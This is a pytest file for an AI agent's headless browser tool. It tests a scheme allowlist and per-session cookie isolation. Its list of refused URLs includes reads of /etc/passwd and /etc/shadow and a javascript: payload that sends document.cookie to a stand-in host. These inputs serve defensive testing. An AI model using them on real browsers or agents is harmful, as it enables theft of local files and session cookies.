"""The browser tool's navigation perimeter and per-session isolation.

Two defects, both measured on the real code:

* ``navigate`` handed any string to ``page.goto``. With headless Chromium,
  ``file://`` renders a local file as a page — arbitrary local file read
  through a tool whose purpose is fetching the web.
* ``_browser``/``_page`` were CLASS attributes assigned through ``self``, and
  one registry is built per daemon, so it was ONE page in ONE context for the
  daemon's entire uptime. Every session navigated carrying every other
  session's cookies and localStorage.

Playwright is an optional extra and is not installed here, so the lifecycle is
driven through a fake. That is not a compromise for these properties: what is
under test is which URLs reach ``goto`` and which context a page comes from,
and a fake records both exactly.
"""

from __future__ import annotations

import ast
import pathlib
from pathlib import Path

import pytest

from prometheus.tools.base import ToolExecutionContext
from prometheus.tools.builtin import browser as browser_mod
from prometheus.tools.builtin.browser import (
    ALLOWED_SCHEMES,
    MAX_CONTEXTS,
    BrowserAction,
    BrowserInput,
    BrowserTool,
    _refuse_scheme,
)


# --------------------------------------------------------------------------- #
# Fake playwright — records what the real driver would have been asked to do
# --------------------------------------------------------------------------- #


class _FakeResponse:
    status = 200


class _FakePage:
    def __init__(self, context: "_FakeContext") -> None:
        self.context = context
        self.goto_urls: list[str] = []

    async def goto(self, url: str, **kwargs: object) -> _FakeResponse:
        self.goto_urls.append(url)
        return _FakeResponse()

    async def title(self) -> str:
        return "fake"


class _FakeContext:
    def __init__(self, index: int) -> None:
        self.index = index
        self.closed = False
        self.page = _FakePage(self)

    async def new_page(self) -> _FakePage:
        return self.page

    async def close(self) -> None:
        self.closed = True


class _FakeBrowser:
    def __init__(self) -> None:
        self.contexts: list[_FakeContext] = []
        self.closed = False
        self._connected = True

    def is_connected(self) -> bool:
        return self._connected

    async def new_context(self) -> _FakeContext:
        ctx = _FakeContext(len(self.contexts))
        self.contexts.append(ctx)
        return ctx

    async def close(self) -> None:
        self.closed = True
        self._connected = False


class _FakePlaywright:
    def __init__(self) -> None:
        self.browser = _FakeBrowser()
        self.launches = 0
        self.stopped = False

        class _Chromium:
            async def launch(_self, **kwargs: object) -> _FakeBrowser:
                self.launches += 1
                return self.browser

        self.chromium = _Chromium()

    async def stop(self) -> None:
        self.stopped = True


@pytest.fixture()
def fake_pw(monkeypatch: pytest.MonkeyPatch) -> _FakePlaywright:
    pw = _FakePlaywright()

    class _Starter:
        async def start(self) -> _FakePlaywright:
            return pw

    monkeypatch.setattr(browser_mod, "async_playwright", lambda: _Starter())
    return pw


def _ctx(session_id: str | None) -> ToolExecutionContext:
    if session_id is None:
        return ToolExecutionContext(cwd=Path.cwd())
    return ToolExecutionContext(cwd=Path.cwd(), metadata={"session_id": session_id})


async def _navigate(tool: BrowserTool, url: str, session: str | None = "telegram:1"):
    return await tool.execute(
        BrowserInput(action=BrowserAction.navigate, url=url), _ctx(session)
    )


# --------------------------------------------------------------------------- #
# The scheme allowlist
# --------------------------------------------------------------------------- #


@pytest.mark.asyncio
@pytest.mark.parametrize("url", [
    "file:///etc/passwd",
    "FILE:///etc/shadow",
    "  file:///var/lib/secrets/key  ",   # leading/trailing whitespace
    "javascript:fetch('http://x/'+document.cookie)",
    "data:text/html,<script>1</script>",
    "about:config",
    "chrome://settings",
    "ftp://example.com/x",
    "example.com/no-scheme",
])
async def test_navigate_refuses_everything_but_http(url, fake_pw):
    tool = BrowserTool()
    result = await _navigate(tool, url)

    assert result.is_error, f"{url!r} was not refused"
    assert result.output.startswith("Blocked:")
    # THE POINT: refused before the browser exists. A refusal that still
    # launched Chromium would leave a process behind for every probe.
    assert fake_pw.launches == 0
    assert fake_pw.browser.contexts == []


@pytest.mark.asyncio
async def test_a_file_url_refusal_points_at_read_file():
    """The model retries a refusal it cannot interpret."""
    assert "read_file" in (_refuse_scheme("file:///etc/passwd") or "")


@pytest.mark.asyncio
@pytest.mark.parametrize("url", [
    "http://example.com/",
    "https://example.com/page?q=1",
])
async def test_navigate_allows_http_and_https(url, fake_pw):
    tool = BrowserTool()
    result = await _navigate(tool, url)

    assert not result.is_error, result.output
    assert fake_pw.browser.contexts[0].page.goto_urls == [url]


@pytest.mark.asyncio
async def test_hop_zero_may_still_reach_the_operators_own_services(fake_pw):
    """A DECISION, pinned so it cannot change unnoticed.

    This is a scheme allowlist, not an address-class guard. Pointing the
    browser at your own dashboard is legitimate, and D4 reserves hop-0 tailnet
    for the same reason. Chromium's own redirects remain unguarded — closing
    that needs page.route interception, which must be built against a real
    playwright install.
    """
    tool = BrowserTool()
    result = await _navigate(tool, "http://127.0.0.1:8005/")
    assert not result.is_error, result.output


def test_the_allowlist_is_exactly_the_web_schemes():
    assert ALLOWED_SCHEMES == {"http", "https"}


# --------------------------------------------------------------------------- #
# Per-session isolation
# --------------------------------------------------------------------------- #


@pytest.mark.asyncio
async def test_two_sessions_never_share_a_context(fake_pw):
    """The cookie-jar bleed. Two sessions, two contexts, one browser process."""
    tool = BrowserTool()
    await _navigate(tool, "http://a.example/", session="telegram:1")
    await _navigate(tool, "http://b.example/", session="telegram:2")

    assert len(fake_pw.browser.contexts) == 2
    assert fake_pw.launches == 1, "a second session must not relaunch the browser"
    first, second = fake_pw.browser.contexts
    assert first.page.goto_urls == ["http://a.example/"]
    assert second.page.goto_urls == ["http://b.example/"]


@pytest.mark.asyncio
async def test_one_session_reuses_its_context_across_calls(fake_pw):
    """A login flow is several tool calls; a fresh context would drop the cookie."""
    tool = BrowserTool()
    await _navigate(tool, "http://login.example/", session="cli")
    await _navigate(tool, "http://app.example/", session="cli")

    assert len(fake_pw.browser.contexts) == 1
    assert fake_pw.browser.contexts[0].page.goto_urls == [
        "http://login.example/", "http://app.example/",
    ]


@pytest.mark.asyncio
async def test_contexts_are_capped_and_the_oldest_is_closed(fake_pw):
    tool = BrowserTool()
    for i in range(MAX_CONTEXTS + 1):
        await _navigate(tool, f"http://s{i}.example/", session=f"telegram:{i}")

    assert len(tool._contexts) == MAX_CONTEXTS
    assert fake_pw.browser.contexts[0].closed, "the oldest context was not closed"
    assert not fake_pw.browser.contexts[-1].closed


@pytest.mark.asyncio
async def test_eviction_is_least_recently_used_not_first_created(fake_pw):
    tool = BrowserTool()
    for i in range(MAX_CONTEXTS):
        await _navigate(tool, f"http://s{i}.example/", session=f"telegram:{i}")
    # Touch the oldest so it is no longer least-recently-used.
    await _navigate(tool, "http://again.example/", session="telegram:0")
    await _navigate(tool, "http://new.example/", session="telegram:new")

    assert "telegram:0" in tool._contexts, "a recently used session was evicted"
    assert "telegram:1" not in tool._contexts


@pytest.mark.asyncio
async def test_a_metadata_less_context_gets_its_own_key(fake_pw):
    """Jobs and cron build a bare context; they must not land in a real session."""
    tool = BrowserTool()
    await _navigate(tool, "http://job.example/", session=None)
    await _navigate(tool, "http://user.example/", session="cli")

    assert len(fake_pw.browser.contexts) == 2


# --------------------------------------------------------------------------- #
# close
# --------------------------------------------------------------------------- #


@pytest.mark.asyncio
async def test_close_ends_only_the_calling_session(fake_pw):
    """Closing the shared browser would discard another session's login."""
    tool = BrowserTool()
    await _navigate(tool, "http://a.example/", session="telegram:1")
    await _navigate(tool, "http://b.example/", session="telegram:2")

    result = await tool.execute(
        BrowserInput(action=BrowserAction.close), _ctx("telegram:1")
    )

    assert not result.is_error
    assert fake_pw.browser.contexts[0].closed
    assert not fake_pw.browser.contexts[1].closed
    assert not fake_pw.browser.closed, "the browser died with one session's close"
    assert "telegram:2" in tool._contexts


@pytest.mark.asyncio
async def test_closing_the_last_session_stops_the_driver_too(fake_pw):
    """The old code kept the start() handle in a local, so stop() was unreachable."""
    tool = BrowserTool()
    await _navigate(tool, "http://a.example/", session="cli")
    await tool.execute(BrowserInput(action=BrowserAction.close), _ctx("cli"))

    assert fake_pw.browser.closed
    assert fake_pw.stopped, "the playwright driver subprocess was left running"
    assert tool._contexts == {}


@pytest.mark.asyncio
async def test_close_on_a_session_that_never_opened_one_is_not_an_error(fake_pw):
    tool = BrowserTool()
    result = await tool.execute(BrowserInput(action=BrowserAction.close), _ctx("cli"))
    assert not result.is_error


# --------------------------------------------------------------------------- #
# The class-attribute shape that caused it
# --------------------------------------------------------------------------- #


def test_state_is_per_instance_not_class_level():
    assert BrowserTool()._contexts is not BrowserTool()._contexts


def test_no_mutable_browser_state_is_declared_on_the_class():
    """Structural: the defect was a declared class attribute assigned via self.

    Re-introducing that shape would restore one shared page across every
    session, and no behavioural test would notice while only one registry
    exists per process.
    """
    source = pathlib.Path(browser_mod.__file__).read_text(encoding="utf-8")
    tree = ast.parse(source)
    cls = next(
        n for n in ast.walk(tree)
        if isinstance(n, ast.ClassDef) and n.name == "BrowserTool"
    )
    declared = {
        t.id
        for node in cls.body if isinstance(node, (ast.AnnAssign, ast.Assign))
        for t in ([node.target] if isinstance(node, ast.AnnAssign) else node.targets)
        if isinstance(t, ast.Name)
    }
    leaked = {n for n in declared if n.startswith("_")}
    assert not leaked, (
        f"{sorted(leaked)} are declared on the class. Browser handles must be "
        "created in __init__ — as class attributes they read as shared state "
        "while being assigned per-instance, which is how one page ended up "
        "serving every session for the daemon's uptime."
    )


def test_the_description_states_unavailability_exactly_when_it_applies():
    """Honest in both environments, rather than asserting this box's state."""
    installed = browser_mod.async_playwright is not None
    says_unavailable = "UNAVAILABLE" in BrowserTool.description
    assert says_unavailable is not installed, (
        f"playwright installed={installed} but description "
        f"{'does' if says_unavailable else 'does not'} say UNAVAILABLE"
    )


@pytest.mark.asyncio
async def test_without_playwright_every_action_errors_without_launching(monkeypatch):
    monkeypatch.setattr(browser_mod, "async_playwright", None)
    tool = BrowserTool()
    result = await _navigate(tool, "http://example.com/")
    assert result.is_error
    assert "playwright is not installed" in result.output
